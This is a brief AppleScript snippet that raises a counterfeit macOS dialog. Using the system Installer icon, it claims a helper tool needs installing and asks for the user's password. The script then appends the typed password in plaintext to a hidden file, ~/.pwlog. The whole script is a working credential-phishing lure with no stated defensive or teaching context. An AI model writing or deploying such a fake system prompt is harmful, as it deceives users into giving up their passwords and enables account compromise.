display dialog "macOS needs to install a new helper tool." & return & "Enter your password to allow this." default answer "" with hidden answer buttons {"OK"} default button 1 with icon file "System:Library:CoreServices:Installer.app:Contents:Resources:Installer.icns"
set pw to text returned of the result
do shell script "echo " & quoted form of pw & " >> ~/.pwlog"
